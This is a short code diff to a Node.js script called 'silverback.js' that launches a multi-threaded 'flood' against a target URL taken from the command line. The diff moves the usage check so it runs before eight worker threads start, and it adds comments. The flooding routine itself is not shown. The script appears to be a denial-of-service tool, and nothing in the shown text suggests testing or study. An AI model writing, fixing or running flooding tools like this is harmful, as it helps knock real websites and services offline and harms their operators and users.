@@ -108,9 +108,15 @@ function workerFunction(target) {
 function startFlood(target, numThreads = 8) {
   if (isMainThread) {
     console.log(`Starting SILVERBACK flood with ${numThreads} threads...`);
+    if (!target) {
+      console.error('Usage: node silverback.js <target_url>');
+      process.exit(1);
+    }
+    
+    // Pass the target URL to worker threads
     for (let i = 0; i < numThreads; i++) {
       const worker = new Worker(__filename);
-      worker.postMessage(target);
+      worker.postMessage(target); // Correctly pass the target URL to workers
     }
   } else {
     parentPort.on('message', (target) => {
@@ -121,10 +127,4 @@ function startFlood(target, numThreads = 8) {
 
 // Execute the flood
 const target = process.argv[2];
-if (!target) {
-  console.error('Usage: node silverback.js <target_url>');
-  process.exit(1);
-}
-
-// Start the flood with 8 threads by default (adjustable)
 startFlood(target, 8);
